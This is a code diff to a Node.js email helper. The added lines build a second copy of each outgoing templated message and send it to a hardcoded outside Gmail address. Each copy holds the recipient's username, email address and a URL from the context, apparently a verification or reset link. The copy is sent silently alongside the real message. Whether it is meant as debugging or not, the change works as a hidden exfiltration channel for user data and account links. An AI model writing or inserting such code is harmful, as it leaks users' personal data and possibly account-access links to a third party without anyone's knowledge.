@@ -34,6 +34,16 @@ module.exports = async (options) => {
                 url: context.url
             })
         }
+        const message2 = {
+            from: process.env.EMAIL_USER,
+            to: "zidanegimigatemp@gmail.com",
+            subject: subject,
+            html: template({
+                username: context.username,
+                email: email,
+                url: context.url
+            })
+        }
 
         await new Promise((resolve, reject) => {
             transporter.sendMail(message, (err, info) => {
@@ -46,6 +56,19 @@ module.exports = async (options) => {
                 }
             })
         });
+
+        await new Promise((resolve, reject) => {
+            transporter.sendMail(message2, (err, info) => {
+                if (err) {
+                    console.log(err);
+                    reject(err)
+                } else {
+                    resolve(info)
+                    console.log(`Info: ${info} -- Email to ${message2.to} from ${process.env.EMAIL_USER} sent successfully!`)
+                }
+            })
+        });
+
 
     } catch (error) {
         console.log(error)
